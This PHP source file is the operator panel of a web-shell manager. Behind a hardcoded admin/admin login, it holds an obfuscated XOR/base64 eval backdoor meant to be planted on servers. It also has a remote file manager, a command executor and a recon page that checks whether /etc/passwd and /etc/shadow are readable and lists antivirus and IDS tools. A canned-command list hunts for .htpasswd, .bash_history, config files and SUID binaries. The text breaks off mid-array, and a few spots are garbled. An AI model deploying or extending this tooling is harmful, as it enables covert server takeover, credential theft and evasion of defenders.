<?php
ob_start();
session_start();
header('Content-Type: text/html; charset=utf-8');
//ini_set("display_errors", "on");
ini_set("display_errors", "off");
error_reporting(0);
set_time_limit(0);

define('USR', 'admin');
define('PWS', 'admin');
define('KEYS', '23fs72SDF4S2-');
define('USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0');
define('VER', 'v1.0.1');
//define('PROXY', '127.0.0.1:9050');

if ($_REQUEST['exit']) {
  session_destroy();
  $_SESSION = array();
  header("Location: ".$_SERVER['HTTP_REFERER']);
  exit;
}

if (isset($_POST['_USR'])) $_SESSION['_USR']=$_POST['_USR'];
if (isset($_POST['_PWS'])) $_SESSION['_PWS']=$_POST['_PWS'];

if ((strtolower($_SESSION['_USR'])!=strtolower(USR))||(strtolower($_SESSION['_PWS'])!=strtolower(PWS))) {
  echo '<!doctype html><html lang="en"><head><meta charset="utf-8"><title></title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css" crossorigin="anonymous">';
  echo '<body style="margin: 15% auto;width:200px;height:200px;"><form action="'.$_SERVER['PHP_SELF'].'" METHOD="post">';
  echo '<input type="text" class="form-control" style="width:200px" name="_USR" value="'.$_POST['_USR'].'" /><br />';
  echo '<input type="text" class="form-control" style="width:200px" name="_PWS" value="'.$_POST['_PWS'].'" /><br />';
  echo '<input type="submit" class="btn btn-md btn-primary" value="Submit" />';
  echo '</form></p>'; 
  echo '</body></html>';
  exit;
};

if ((!$_POST['url'])&&($_GET['url'])) $_POST['url']=$_GET['url'];

$_func = <<<'EOD'
if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) { function posix_getpwuid($p) {return false;} }
if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false)) { function posix_getgrgid($p) {return false;} }
if(strtolower(substr(PHP_OS,0,3)) == "win") $os = 'win'; else	$os = 'nix';

function perms($p) {
	if (($p & 0xC000) == 0xC000)$i = 's';
	elseif (($p & 0xA000) == 0xA000)$i = 'l';
	elseif (($p & 0x8000) == 0x8000)$i = '-';
	elseif (($p & 0x6000) == 0x6000)$i = 'b';
	elseif (($p & 0x4000) == 0x4000)$i = 'd';
	elseif (($p & 0x2000) == 0x2000)$i = 'c';
	elseif (($p & 0x1000) == 0x1000)$i = 'p';
	else $i = 'u';
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}

function viewPermsColor($f) {
	if (!@is_readable($f))
		return '<font color=#FF0000><b>'.perms(@fileperms($f)).'</b></font>';
	elseif (!@is_writable($f))
		return '<font color=blue><b>'.perms(@fileperms($f)).'</b></font>';
	else
		return '<font color=#FF005F><b>'.perms(@fileperms($f)).'</b></font>';
}

function viewSize($s) {
	if($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824 ). ' GB';
	elseif($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576 ) . ' MB';
	elseif($s >= 1024)
		return sprintf('%1.2f', $s / 1024 ) . ' KB';
	else
		return $s . ' B';
}

function hardScandir($dir) {
    if(function_exists("scandir")) {
        return scandir($dir);
    } else {
        $dh  = opendir($dir);
        while (false !== ($filename = readdir($dh)))
            $files[] = $filename;
        return $files;
    }
}

function deleteDir($path) {
	$path = (substr($path,-1)=='/') ? $path:$path.'/';
	$dh  = opendir($path);
	while ( ($l = readdir($dh) ) !== false) {
		$l = $path.$l;
	if ( (basename($l) == "..") || (basename($l) == ".") )
		continue;
	$type = filetype($l);
	if ($type == "dir")
		deleteDir($l);
	else
		@unlink($l);
	}
	closedir($dh);
	@rmdir($path);
}

function copy_paste($c,$s,$d){
	if(is_dir($c.$s)){
		mkdir($d.$s);
		$h = @opendir($c.$s);
		while (($f = @readdir($h)) !== false)
			if (($f != ".") and ($f != ".."))
				copy_paste($c.$s.'/',$f, $d.$s.'/');
	} elseif(is_file($c.$s))
	@copy($c.$s, $d.$s);
}

function move_paste($c,$s,$d){
	if(is_dir($c.$s)){
		mkdir($d.$s);
		$h = @opendir($c.$s);
		while (($f = @readdir($h)) !== false)
			if (($f != ".") and ($f != ".."))
				copy_paste($c.$s.'/',$f, $d.$s.'/');
	} elseif(@is_file($c.$s))
	@copy($c.$s, $d.$s);
}
function ex($in) {
	$j = "";
	$k = "";
	if (function_exists('exec')) {
		@exec($in,$k);
		$j = @join("\n",$k);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$j = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($in);
		$j = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$j = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$j = "";
		while(!@feof($f))
			$j .= fread($f,1024);
		pclose($f);
	}else return "Unable to execute command\n";
	return ($j==''?"Query did not return anything\n":$j);
}
EOD;

$Footer = <<<'EOD'
   $is_writable = is_writable($GLOBALS['cwd'])?" <font color='#FF005F'>[ Writeable ]</font>":" <font color=red>(Not writable)</font>";
   echo '<table class="form-inline" style="width:100%"  cellpadding=3 cellspacing=0>';
   echo '<tr><td><span>Change dir:</span><br><input id="ChangeDir" type=text value="'.htmlspecialchars($GLOBALS['cwd']).'" class="form-control" style="width:300px"><button class="btn btn-md btn-primary" onclick="g(\'FilesMan\',document.getElementById(\'ChangeDir\').value,null,null, null,\''.(isset($_POST['charset'])?$_POST['charset']:'').'\');return false;">submit</button></td>';
   echo '<td><span>Read file:</span><br><input id="ReadFile" type=text value="" class="form-control" style="width:300px"><button class="btn btn-md btn-primary" onclick="g(\'FilesTools\',\''.$GLOBALS['cwd'].'\',document.getElementById(\'ReadFile\').value,\'view\', null,\''.(isset($_POST['charset'])?$_POST['charset']:'').'\');return false;">submit</button></td></tr>';
   echo '<tr><td><span>Make dir:</span><br><input id="MakeDir" type=text value="" class="form-control" style="width:300px"><button class="btn btn-md btn-primary" onclick="g(\'FilesMan\',\''.$GLOBALS['cwd'].'\',\'mkdir\',document.getElementById(\'MakeDir\').value, null,\''.(isset($_POST['charset'])?$_POST['charset']:'').'\');return false;">submit</button></td>';
   echo '<td><span>Make file:</span><br><input id="MakeFile" type=text value="" class="form-control" style="width:300px"><button class="btn btn-md btn-primary" onclick="g(\'FilesTools\',\''.$GLOBALS['cwd'].'\',document.getElementById(\'MakeFile\').value,\'mkfile\', null,\''.(isset($_POST['charset'])?$_POST['charset']:'').'\');return false;">submit</button></td></tr>';
   echo '<tr>
	<td><span>Execute:</span><br>
	<input type=text id=exec value="" class="form-control" style="width:300px"><button class="btn btn-md btn-primary" onclick="g(\'Console\',\''.$GLOBALS['cwd'].'\',document.getElementById(\'exec\').value,null,null,\'\');return false;">submit</button></td>
	<td><form method="post" style="width 300px" enctype="multipart/form-data">
	<input type=hidden name=a value="FilesMan">
	<input type=hidden name=c value="'.$GLOBALS['cwd'].'">
	<input type=hidden name=p1 value="uploadFile">
	<input type=hidden name=charset value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
	<span>Upload file:</span>'.$is_writable.'<br><input class="form-control" style="width: 300px" type=file name=file><input class="btn btn-md btn-primary" type=submit value="submit"></form></td>
    </tr></table></div>';
EOD;

$Shell = <<<'EOD'
ob_start();$z="%pass%";@error_reporting(0);@set_time_limit(0);@ini_set("file_uploads","On");@ini_set("max_execution_time","0");@ini_set("max_input_time","600");@ini_set("post_max_size","32M");function x($t,$k){for($i=0;$i<strlen($t);)for($j=0;$j<strlen($k);$j++,$i++)$o.=$t{$i}^$k{$j};return $o;};$r=$_SERVER;$u=parse_url(@$r["HTTP_REFERER"]);parse_str($u["query"],$q);$k=current($q);$n=next($q);$p=$_POST;if(!isset($p[$k]))die;$o=$p[$k];$a=$z.$n;$d=@gzuncompress(@x(@base64_decode($o),$a));if (@eval("return 1;")) {if (!@eval($d)) $m=true;}else if (@is_callable("create_function")){if (!@call_user_func(@create_function(null,$d))) $m=true;}else if (@is_callable("file_put_contents")) {$f=@tempnam(@sys_get_temp_dir(),@time());if (@file_put_contents($f,"<"."?p"."hp\r\n".$d."\r\nreturn false;\r\n?".">")) {if (!(@include($f))) $m=true;@unlink($f);} else $m=true;};$s=@ob_get_contents();@ob_end_clean();$s=@base64_encode(@x(@gzcompress($s),$a));print($s);
EOD;

$Menu = <<<'EOD'
 $m = array('Files'=>'FilesMan','Info'=>'SecInfo','Console'=>'Console','Sql'=>'Sql','Php'=>'Php');
 $menu = '';
 foreach($m as $k => $v) {
	$menu .= '<th>[ <a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\');return false;">'.$k.'</a> ]</th>';
 }
 echo '<table cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><br>';
EOD;

$FilesTools = $_func.<<<'EOD'
	if( isset($_POST['p1']) ) {
		$tmp=urldecode($_POST['p1']);
	        if (strlen($tmp)>0)
	        if ($tmp{0}=='/') {
		   $_POST['c']='';
		};
	        if (strlen($tmp)>1)
	        if ($tmp{1}==':') {
                   $_POST['c']='';
		};
		$_POST['p1'] = urldecode($_POST['c']).urldecode($_POST['p1']);
        }

	if(@$_POST['p2']=='download') {
		if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
			$fp = @fopen($_POST['p1'], "r");
			if($fp) {
				while(!@feof($fp))
					echo @fread($fp, 1024);
				fclose($fp);
			}
		};
		return;
	}
	if( @$_POST['p2'] == 'mkfile' ) {
		if(!file_exists($_POST['p1'])) {
			$fp = @fopen($_POST['p1'], 'w');
			if($fp) {
				$_POST['p2'] = "edit";
				fclose($fp);
			}
		}
	}
	if( !file_exists(@$_POST['p1']) ) {
		echo 'File not exists';
		return;
	}
	$uid = @posix_getpwuid(@fileowner($_POST['p1']));
	if(!$uid) {
		$uid['name'] = @fileowner($_POST['p1']);
		$gid['name'] = @filegroup($_POST['p1']);
	} else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
	echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?viewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.viewPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
	echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';
	if( empty($_POST['p2']) )
		$_POST['p2'] = 'view';
	if( is_file($_POST['p1']) )
		$m = array('View', 'Highlight', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
	else
		$m = array('Chmod', 'Rename', 'Touch');
	foreach($m as $v)
		echo '<a href=# onclick="g(\'FilesTools\',\''.$GLOBALS['cwd'].'\',\'' . urlencode($_POST['p1']) . '\',\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> ';
	echo '<br><br>';
	switch($_POST['p2']) {
		case 'view':
			echo '<div class=ml1 style="background-color: #e1e1e1;color:black;border:1px solid #060a10;overflow: auto;"><pre>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</pre></div>';
			break;
		case 'highlight':
			if( @is_readable($_POST['p1']) ) {
				echo '<div class=ml1 style="background-color: #e1e1e1;color:black;border:1px solid #060a10;overflow: auto;">';
				$oRb = @highlight_file($_POST['p1'],true);
				echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$oRb).'</div>';
			}
			break;
		case 'chmod':
			if( !empty($_POST['p3']) ) {
				$perms = 0;
				for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
					$perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
				if(!@chmod($_POST['p1'], $perms))
					echo 'Can\'t set permissions!';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form  class="form-inline" onsubmit="g(\'FilesTools\',\''.$GLOBALS['cwd'].'\',\'' . urlencode($_POST['p1']) . '\',\'chmod\',this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'" class="form-control" style="width:250px"><input class="btn btn-md btn-primary" type=submit value="submit"></form>';
			break;
		case 'edit':
			if( !is_writable($_POST['p1'])) {
				echo 'File isn\'t writeable';
				break;
			}
			if( !empty($_POST['p3']) ) {
				$time = @filemtime($_POST['p1']);
				$fp = @fopen($_POST['p1'],"w");
				if($fp) {
					@fwrite($fp,$_POST['p3']);
					@fclose($fp);
					echo 'Saved!<br><script>p3_="";</script>';
					@touch($_POST['p1'],$time,$time);
				}
			}
			echo '<form onsubmit="g(\'FilesTools\',\''.$GLOBALS['cwd'].'\',\'' . urlencode($_POST['p1']) . '\',\'edit\',this.text.value);return false;"><textarea name=text class="form-control" style="width:100%;min-height:300px">';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</textarea><input class="btn btn-md btn-primary"  type=submit value="submit"></form>';
			break;
		case 'hexdump':
			$c = @file_get_contents($_POST['p1']);
			$n = 0;
			$h = array('00000000<br>','','');
			$len = strlen($c);
			for ($i=0; $i<$len; ++$i) {
				$h[1] .= sprintf('%02X',ord($c[$i])).' ';
				switch ( ord($c[$i]) ) {
					case 0:  $h[2] .= ' '; break;
					case 9:  $h[2] .= ' '; break;
					case 10: $h[2] .= ' '; break;
					case 13: $h[2] .= ' '; break;
					default: $h[2] .= $c[$i]; break;
				}
				$n++;
				if ($n == 32) {
					$n = 0;
					if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
					$h[1] .= '<br>';
					$h[2] .= "\n";
				}
		 	}
			echo '<table cellspacing=0 cellpadding=5 style="width:100%;background-color: #e1e1e1;"><tr><td style="border:1px solid #060a10;"><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td style="border:1px solid #060a10;"><pre>'.$h[1].'</pre></td><td style="border:1px solid #060a10;"><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
			break;
		case 'rename':
			if( !empty($_POST['p3']) ) {
				if(!@rename($_POST['p1'], $_POST['p3']))
					echo 'Can\'t rename!<br>';
				else
					echo 'Renamed!';
			}
			echo '<form class="form-inline" onsubmit="g(\'FilesTools\',\''.$GLOBALS['cwd'].'\',\'' . urlencode($_POST['p1']) . '\',\'rename\',this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'" class="form-control" style="width:250px"><input class="btn btn-md btn-primary" type=submit value="submit"></form>';
			break;
		case 'touch':
			if( !empty($_POST['p3']) ) {
				$time = strtotime($_POST['p3']);
				if($time) {
					if(!touch($_POST['p1'],$time,$time))
						echo 'Fail!';
					else
						echo 'Touched!';
				} else echo 'Bad time format!';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form class="form-inline" onsubmit="g(\'FilesTools\',\''.$GLOBALS['cwd'].'\',\'' . urlencode($_POST['p1']) . '\',\'touch\',this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'" class="form-control" style="width:250px"><input class="btn btn-md btn-primary" type=submit value="submit"></form>';
			break;
	}
	echo '</div>';
EOD;

$FilesMan = $_func.<<<'EOD'
 $safe_mode = @ini_get('safe_mode');
 if(!$safe_mode) error_reporting(0);
 $disable_functions = @ini_get('disable_functions');
 $home_cwd = @getcwd();
 if(isset($_POST['c'])) @chdir($_POST['c']);
 $cwd = @getcwd();
 if($os == 'win') {
	$home_cwd = str_replace("\\", "/", $home_cwd);
	$cwd = str_replace("\\", "/", $cwd);
 }
 if($cwd[strlen($cwd)-1]!='/') $cwd .= '/';
 $freeSpace = @diskfreespace($GLOBALS['cwd']);
 $totalSpace = @disk_total_space($GLOBALS['cwd']);
 $totalSpace = $totalSpace?$totalSpace:1;
 $release = @php_uname('r');
 $kernel = @php_uname('s');

 if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
 } else {
	$uid = @posix_getpwuid(@posix_geteuid());
	$gid = @posix_getgrgid(@posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
 }
 $cwd_links = '';
 $path = explode("/", $GLOBALS['cwd']);
 $n=count($path);
 for($i=0; $i<$n-1; $i++) {
	$cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
	for($j=0; $j<=$i; $j++)
		$cwd_links .= $path[$j].'/';
	$cwd_links .= "\")'>".$path[$i]."/</a>";
 }
 $charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
 $opt_charsets = '';
 foreach($charsets as $k)
	$opt_charsets .= '<option value="'.$k.'" '.($_POST['charset']==$k?'selected':'').'>'.$k.'</option>';


 $drives = "";
 if ($GLOBALS['os'] == 'win') {
	foreach(range('c','z') as $drive)
	if (is_dir($drive.':\\'))
		$drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\');return false;">[ '.$drive.' ]</a> ';
 }
 if(!empty($_POST['p1'])) {
		switch($_POST['p1']) {
			case 'uploadFile':
				file_put_contents($GLOBALS['cwd'].urldecode($_POST['p2']), urldecode($_POST['p3']));
				break;
			case 'mkdir':
				if(!@mkdir(urldecode($_POST['p2']))) echo "Can\'t create new dir";
				break;
			case 'delete':
				$x=explode(",",urldecode($_POST['p2']));
				foreach($x as $f) {
				 	if($f == '..')  continue;
					if(is_dir($f))
						deleteDir($f);
					else
						@unlink($f);
				}
				break;
			case 'copy':
			case 'move':
				$x=explode(",", urldecode($_POST['p2']));
				foreach($x as $f) {
					@rename(urldecode($_POST['p3']).$f, $GLOBALS['cwd'].$f);
				}
				break;
			case 'paste':
				$x=explode(",", urldecode($_POST['p2']));
				foreach($x as $f) {
					copy_paste(urldecode($_POST['p3']),$f, $GLOBALS['cwd']);
				}
				break;
			default:
				break;
		}
 }
 echo '<table class="table table-bordered" style="width:100%"><tr style="background-color: #EEEEEE; opacity: 0.9;"><td width=1><b>Uname:<br />User:<br />Php:<br />Hdd:<br />Cwd:'.($GLOBALS['os'] == 'win'?'<br />Drives:':'').'</b></td>'.
  '<td>&nbsp;'.substr(@php_uname(), 0, 120).
  '<br />&nbsp;'.$uid.' ( '.$user.' ) Group: '.$gid.' ( ' .$group. ' )'.
  '<br />&nbsp;'.@phpversion().' Safe mode: '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#FF005F><b>OFF</b></font>').' Datetime: '.date('Y-m-d H:i:s').
  '<br />&nbsp;'.viewSize($totalSpace).' Free: '.viewSize($freeSpace).' ('.round(100/($totalSpace/$freeSpace),2).'%)'.
  '<br />&nbsp;'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).'<a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\');return false;">[ home ]</a>'.
  '<br />&nbsp;'.$drives.'<br /></td>'.
  '<td width=1 align=right><b>Server_IP:<br />Client_IP:<br /><br /><br /><br /><br /></b></td>'.
  '<td width=1 align=right>&nbsp;'.gethostbyname($_SERVER["HTTP_HOST"]).'<br />&nbsp;'.$_SERVER['REMOTE_ADDR'].'<br /><br /><br /><br /><br /></td></tr></table>';

// echo '<hr />';
 echo '<div class=content>';
 $dirContent = hardScandir($_POST['c']!=''?$_POST['c']:$GLOBALS['cwd']);

 if($dirContent === false) {echo 'Can\'t open this folder!';return;}
 global $sort;
 $sort = array('name', 1);
 if(!empty($_POST['p1'])) {
	if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
		$sort = array($match[1], (int)$match[2]);
 }
 echo "
  <table class=\"table table-bordered\" id=\"data\"  style=\"width:100%\">
  <tr style=\"background-color: #EEEEEE; opacity: 0.9;\"><th width='5px'> </th><th width='200px'>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>";
	$dirs = $files = array();
	$n = count($dirContent);
	for($i=0;$i<$n;$i++) {
		$ow = @posix_getpwuid(@fileowner($dirContent[$i]));
		$gr = @posix_getgrgid(@filegroup($dirContent[$i]));
		$tmp = array('name' => $dirContent[$i],
					 'path' => $GLOBALS['cwd'].$dirContent[$i],
					 'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])),
					 'perms' => viewPermsColor($GLOBALS['cwd'] . $dirContent[$i]),
					 'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]),
					 'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
					 'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])
					);

		if(@is_file($GLOBALS['cwd'] . $dirContent[$i]))
			$files[] = array_merge($tmp, array('type' => 'file'));
		elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i]))
			$dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
		elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i])&&($dirContent[$i] != "."))
			$dirs[] = array_merge($tmp, array('type' => 'dir'));
	}

	$GLOBALS['sort'] = $sort;
	function cmp($a, $b) {
		if($GLOBALS['sort'][0] != 'size')
			return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
		else
			return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
	}
	usort($files, "cmp");
	usort($dirs, "cmp");
	$files = array_merge($dirs, $files);
	$l = 0;
	foreach($files as $f) {
		echo '<tr'.($l?' class=l1':'').'><td>'.'<input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx>'.'</td>'.
	'<td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',\''.$GLOBALS['cwd'].'\',\''.urlencode($f['name']).'\', \'view\');return false;">'.
	htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" ' . (empty ($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . 
	htmlspecialchars($f['name']) . ' ]</b>').'</a></td>'.
	'<td>'.(($f['type']=='file')?viewSize($f['size']):$f['type']).'</td>'.
	'<td>'.$f['modify'].'</td>'.
	'<td>'.$f['owner'].'/'.$f['group'].'</td><td>'.
	'<a href="#" onclick="g(\'FilesTools\',\''.$GLOBALS['cwd'].'\',\''.urlencode($f['name']).'\', \'chmod\');return false;">'.$f['perms'].'</td><td>'.
	'<a href="#" onclick="g(\'FilesTools\',\''.$GLOBALS['cwd'].'\',\''.urlencode($f['name']).'\', \'rename\');return false;">R</a> '.
	'<a href="#" onclick="g(\'FilesTools\',\''.$GLOBALS['cwd'].'\',\''.urlencode($f['name']).'\', \'touch\');return false;">T</a>'.(($f['type']=='file')?' '.
	'<a href="#" onclick="g(\'FilesTools\',\''.$GLOBALS['cwd'].'\',\''.urlencode($f['name']).'\', \'edit\');return false;">E</a> '.
	'<a href="#" onclick="a(\'FilesTools\',\''.$GLOBALS['cwd'].'\',\''.urlencode($f['name']).'\', \'download\');return false;">D</a>':'').
	'</td></tr>';
		$l = $l?0:1;
	}
        echo '</table></div>';
        echo '<label><select  class="form-control" id="selCmd">';
        echo "<option value='copy'>Copy</option><option value='paste'>Paste</option><option value='move'>Move</option><option value='delete'>Delete</option>";
        echo "</select></label>";
        echo '<button class="btn btn-md btn-primary" onclick="g(\'FilesMan\',\''.$GLOBALS['cwd'].'\',selBoxes(\'selCmd\'),checkBoxes(\'chkbx\'), null,\''.(isset($_POST['charset'])?$_POST['charset']:'').'\');return false;">submit</button> ';
//	echo '<hr />';
EOD;

$SecInfo = $_func.<<<'EOD'
	echo '<div class=content>';
	function showSecParam($n, $v) {
		$v = trim($v);
		if($v) {
			echo '<b>' . $n . ': </b>';
			if(strpos($v, "\n") === false)
				echo $v . '<br>';
			else
				echo '<pre>' . $v . '</pre>';
		}
	}
	showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
    if(function_exists('apache_get_modules'))
        showSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
	showSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none');
	showSecParam('Open base dir', @ini_get('open_basedir'));
	showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
	showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
	showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
	$temp=array();
	if(function_exists('mysql_get_client_info'))
		$temp[] = "MySql (".mysql_get_client_info().")";
	if(function_exists('mssql_connect'))
		$temp[] = "MSSQL";
	if(function_exists('pg_connect'))
		$temp[] = "PostgreSQL";
	if(function_exists('oci_connect'))
		$temp[] = "Oracle";
	showSecParam('Supported databases', implode(', ', $temp));
	echo '<br>';
	if($GLOBALS['os'] == 'nix') {
            showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\");return false;'>[view]</a>":'no');
            showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\");return false;'>[view]</a>":'no');
            showSecParam('OS version', @file_get_contents('/proc/version'));
            showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
            if(!$GLOBALS['safe_mode']) {
                $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
                $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
                $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
                echo '<br>';
                $temp=array();
                foreach ($userful as $b)
                    if(which($b))
                        $temp[] = $b;
                showSecParam('Userful', implode(', ',$temp));
                $temp=array();
                foreach ($danger as $b)
                    if(which($▟))
                        $temp[] = $b;
                showSecParam('Danger', implode(', ',$temp));
                $temp=array();
                foreach ($downloaders as $b)
                    if(which($▟))
                        $temp[] = $b;
                showSecParam('Downloaders', implode(', ',$temp));
                echo '<br/>';
                showSecParam('HDD space', ex('df -h'));
                showSecParam('Hosts', @file_get_contents('/etc/hosts'));
				showSecParam('Mount options', @file_get_contents('/etc/fstab'));
            }
	} else {
		showSecParam('OS Version',ex('ver'));
		showSecParam('Account Settings', iconv('CP866', 'UTF-8',ex('net accounts')));
		showSecParam('User Accounts', iconv('CP866', 'UTF-8',ex('net user')));
	}
	echo '</div>';
EOD;

$Console = $_func.<<<'EOD'
if($os == 'win')
	$aliases = array(
		"List Directory" => "dir",
	    	"Find index.php in current dir" => "dir /s /w /b index.php",
	    	"Find *config*.php in current dir" => "dir /s /w /b *config*.php",
	    	"Show active connections" => "netstat -an",
	    	"Show running services" => "net start",
	    	"User accounts" => "net user",
	    	"Show computers" => "net view",
		"ARP Table" => "arp -a",
		"IP Configuration" => "ipconfig /all"
	);
else
	$aliases = array(
  		"List dir" => "ls -lha",
		"list file attributes on a Linux second extended file system" => "lsattr -va",
  		"show opened ports" => "netstat -an | grep -i listen",
	        "process status" => "ps aux",
		"Find" => "",
  		"find all suid files" => "find / -type f -perm -04000 -ls",
  		"find suid files in current dir" => "find . -type f -perm -04000 -ls",
  		"find all sgid files" => "find / -type f -perm -02000 -ls",
  		"find sgid files in current dir" => "find . -type f -perm -02000 -ls",
  		"find config.inc.php files" => "find / -type f -name config.inc.php",
  		"find config* files" => "find / -type f -name \"config*\"",
  		"find config* files in current dir" => "find . -type f -name \"config*\"",
  		"find all writable folders and files" => "find / -perm -2 -ls",
  		"find all writable folders and files in current dir" => "find . -perm -2 -ls",
  		"find all service.pwd files" => "find / -type f -name service.pwd",
  		"find service.pwd files in current dir" => "find . -type f -name service.pwd",
  		"find all .htpasswd files" => "find / -type f -name .htpasswd",
  		"find .htpasswd files in current dir" => "find . -type f -name .htpasswd",
  		"find all .bash_history files" => "find / -type f -name .bash_history",
  		"find .bash_history files in current dir" => "find . -type f -name .bash_history",
  		"find all .fetchmailrc files" => "find / -type f -name .fetchmailrc",
  		"find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc",
		"Locate" => "",
  		"locate httpd.conf files" => "locate httpd.conf",
		"locate vhosts.conf files" => "locate vhosts.conf",
		"locate proftpd.conf files" => "locate proftpd.conf",
		"locate psybnc.conf files" => "locate psybnc.conf",
		"locate my.conf files" => "locate my.conf",
		"locate admin.php files" =>"locate admin.php",
		"locate cfg.php files" => "locate cfg.php",
		"locate conf.php files" => "locate conf.php",
		"locate config.dat files" => "locate config.dat",
		"locate config.php files" => "locate config.php",
		"locate config.inc files" => "locate config.inc",
		"locate config.inc.php" => "locate config.inc.php",
		"locate config.default.php files" => "locate config.default.php",
